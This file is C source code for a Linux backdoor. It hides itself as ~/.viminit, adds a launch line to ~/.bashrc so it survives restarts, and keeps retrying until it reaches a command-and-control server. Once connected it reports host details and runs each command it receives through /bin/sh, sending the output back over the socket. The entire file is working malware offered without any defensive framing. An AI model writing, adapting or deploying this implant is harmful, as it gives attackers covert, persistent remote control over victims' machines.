#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netdb.h>
#include <sys/utsname.h>
#include <sys/wait.h>
#include <sys/stat.h>

#define TRUE 1
#define FALSE 0
typedef int BOOL;

#define DEFAULT_HOST "127.0.0.1"
#define DEFAULT_PORT "9090"

#define BUFSIZE 1024
#define PERM_755 (S_IRWXU | S_IRGRP | S_IXGRP | S_IROTH | S_IXOTH)

#define WAIT_FOR 30
#define DIS_NAME "NAME="
#define DIS_VERSION "VERSION="

char const* serverHost = NULL;
char const* serverPort = NULL;
char const* hiddenName = ".viminit"; 

int doPersistence(char const* filePath){
	char const* homeAt = getenv("HOME");
	char bashProfileAt[BUFSIZE];
	char hiddenPath[BUFSIZE];
	char command[BUFSIZE];

	sprintf(bashProfileAt, "%s/%s", homeAt, "/.bashrc");
	sprintf(hiddenPath, "%s/%s", homeAt, hiddenName);
	sprintf(command, "%s %s %s\n", hiddenPath, serverHost, serverPort);

	if (strcmp(hiddenPath, filePath)==0){	// already persistence
		return 0;
	}
	if (rename(filePath, hiddenPath) == -1){
		return 1;
	}
	if (chmod(hiddenPath, PERM_755) == -1){
		return 1;
	}
	FILE* s = fopen(bashProfileAt, "a");
	if (s == NULL){
		return 1;
	}
	if (fwrite(command, 1, strlen(command), s) == 0 && ferror(s)){
		return 1;
	}
	fclose(s);
	return 0;
}

// try to connect
int tryConnect(char const* host, char const* port){
	struct addrinfo  hints;
	struct addrinfo* addrInfo = NULL;
	int sockfd = -1;

	memset(&hints, 0, sizeof(struct addrinfo));
	hints.ai_family = AF_INET;
	hints.ai_socktype = SOCK_STREAM;
	hints.ai_addrlen = sizeof(struct addrinfo);

	if (getaddrinfo(host, port, &hints, &addrInfo) != 0){
		return -1;
	}
	if ((sockfd=socket(AF_INET, SOCK_STREAM, 0)) == -1){
		return -1;
	}
	if(connect(sockfd, addrInfo->ai_addr, addrInfo->ai_addrlen) == -1){
		freeaddrinfo(addrInfo);
		close(sockfd);
		return -1;
	}
	freeaddrinfo(addrInfo);
	return sockfd;
}
char const* sysInfoFmt = "---- client information ----\n"
			 "OS: %s\nDISTRO: %s %s\nKERNEL: %s\nARCH: %s\n"
			 "----------------------------\n";
// send system information 
BOOL sendSysInfo(int sockfd){	
	char* sysInfo = NULL;
	struct utsname sstat;
	FILE* stream = NULL;
	char buffer[BUFSIZE];
	char* disName = NULL;
	char* disVersion = NULL;

	if (uname(&sstat) != 0){
		return FALSE;	
	}
	if ((stream=fopen("/etc/os-release", "r")) == NULL){
		return FALSE;
	}
	while(disName==NULL || disVersion==NULL){
		if (!fgets(buffer, BUFSIZE, stream)){
			break;
		}
		if (disName==NULL && strncmp(buffer, DIS_NAME, strlen(DIS_NAME)) == 0){
			disName = strdup(buffer);
			if (disName != NULL){
				disName[strlen(disName)-1] = '\x00';
			}
		}
		if (disVersion==NULL && strncmp(buffer, DIS_VERSION, strlen(DIS_VERSION)) == 0){
			disVersion = strdup(buffer);
			if (disVersion != NULL){
				disVersion[strlen(disVersion)-1] = '\x00';
			}
		}
	}
	// at most
	int sysInfoSize = sizeof(struct utsname) + BUFSIZE*2 + strlen(sysInfoFmt);
	if ((sysInfo=malloc(sysInfoSize)) == NULL){
		return FALSE;
	}
	snprintf(sysInfo, sysInfoSize, sysInfoFmt, sstat.sysname, disName, 
		disVersion, sstat.release, sstat.machine);

	free(disName);
	free(disVersion);
	fclose(stream);

	if (send(sockfd, sysInfo, strlen(sysInfo), 0) <= 0){
		free(sysInfo);
		return FALSE;	
	}

	free(sysInfo);
	return TRUE;
}

char const* prompt = "> ";
int promptSize = 2;

void executeCommands(int sockfd){
	int nsent = 0;
	int nrecv = 0;
	char command[BUFSIZE];
	int pid = -1;

	if (!sendSysInfo(sockfd)){
		return;
	}
	do{
		if ((nsent=write(sockfd, prompt, promptSize)) == -1){
				perror("In write");
				break;
		}
		if (!nsent){
			printf("The peer server closed.\n");
			break;
		}
		if ((nrecv=recv(sockfd, command, BUFSIZE, 0)) == -1){
			perror("In recv");
			break;
		}
		if (!nrecv){
			printf("The peer server closed.\n");
			break;
		}
		command[nrecv] = '\x00';

		// open new process for executing that command
		if ((pid=fork()) == -1){
		} else if (pid == 0){	// child
			// close stdin, stdout, stderr
			if ((dup2(sockfd, 0)!=0) || (dup2(sockfd, 1)!=1) || (dup2(sockfd, 2)!=2)){
				break;
			}
			execl("/bin/sh", "sh", "-c", command, (char*)NULL);
			break;
		} else { // parent
			waitpid(pid, NULL, 0);
		}
	} while(1);
}

int main(int argc, char const** argv){
	int sockfd = -1;
	
	if (argc != 3){
		serverHost = DEFAULT_HOST;
		serverPort = DEFAULT_PORT;
	} else {
		serverHost = argv[1];
		serverPort = argv[2];
	}
	doPersistence(argv[0]);

	while ((sockfd=tryConnect(serverHost, serverPort)) == -1){
		sleep(WAIT_FOR);
	}
	printf("Connected to C&C at %s:%s\n", serverHost, serverPort);
	executeCommands(sockfd);

	close(sockfd);
	return 0;
}
